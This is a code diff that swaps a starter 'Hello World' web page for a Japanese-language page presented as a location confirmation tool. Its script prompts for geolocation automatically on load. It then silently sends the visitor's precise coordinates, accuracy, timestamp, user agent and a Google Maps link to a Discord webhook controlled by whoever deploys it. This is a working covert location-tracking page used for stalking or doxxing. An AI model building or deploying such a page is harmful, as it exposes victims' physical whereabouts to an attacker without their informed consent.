@@ -1,56 +1,71 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="ja">
 <head>
-  <!-- 
-      This is an HTML comment
-      You can write text in a comment and the content won't be visible in the page
-    -->
-
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="icon" href="https://glitch.com/favicon.ico" />
-
-  <!--
-      This is the page head - it contains info the browser uses
-      Like the title, which appears on the browser tab but not inside the page
-      Further down you'll see the content that displays in the page
-    -->
-  <title>Hello World!</title>
-
-  <!-- The website stylesheet -->
-  <link rel="stylesheet" href="/style.css" />
-
-  <!-- The website JavaScript file -->
-  <script src="/script.js" defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>位置情報確認ツール</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
+    h1 { font-size: 2em; }
+    button { font-size: 1.5em; padding: 15px 30px; margin: 20px; }
+  </style>
 </head>
-
 <body>
-  <!--
-      The body includes the content you see in the page
-      Each element is defined using tags, like this <div></div>
-      The attributes like class="wrapper" let us style elements in the CSS
-    -->
-  <div class="wrapper">
-    <div class="content" role="main">
-      <h1 class="title">Oh hi website!</h1>
-      <img src="/cool-website.svg" class="illustration" alt="cool website" />
-      <div class="instructions">
-        <p>
-          Fork <a href="https://github.com/glitchdotcom/website-to-compute">this project</a> and open it in a GitHub Codespace.
-        </p>
-        <p> Follow the steps in the README to deploy your new website to Fastly in a few steps!
-        </p>
+  <h1>位置情報収集システム</h1>
+  <p>位置情報を取得しています...</p>
+  <button onclick="getLocation()">位置情報を許可</button>
 
-      </div>
+  <script>
+    const webhook = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Discord Webhook URLをここに貼り付け
 
-      <footer class="footer">
-        <div>
-          <a class="remix" href="https://github.com/glitchdotcom/website-to-compute">🚧 Get your own site</a>
-        </div>
-      </footer>
-    </div>
-  </div>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendPosition, showError);
+      } else {
+        alert("このブラウザは位置情報に対応していません");
+      }
+    }
+
+    function sendPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const acc = position.coords.accuracy;
+      const timestamp = new Date(position.timestamp).toLocaleString();
+
+      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+      const data = `
+**位置情報取得成功**
+緯度: ${lat}
+経度: ${lon}
+精度: ±${acc}m
+時間: ${timestamp}
+User-Agent: ${navigator.userAgent}
+Google Maps: ${mapsUrl}
+      `;
+
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: data })
+      });
+
+      document.body.innerHTML = '<h1>位置情報を取得しました。ありがとう！</h1>';
+    }
+
+    function showError(error) {
+      let msg;
+      switch(error.code) {
+        case error.PERMISSION_DENIED: msg = "位置情報の許可が拒否されました"; break;
+        case error.POSITION_UNAVAILABLE: msg = "位置情報が取得できません"; break;
+        case error.TIMEOUT: msg = "タイムアウト"; break;
+        default: msg = "不明なエラー"; break;
+      }
+      document.body.innerHTML += `<p>${msg}</p>`;
+    }
+
+    // ページロード時に自動で許可プロンプト表示
+    window.onload = getLocation;
+  </script>
 </body>
-
 </html>
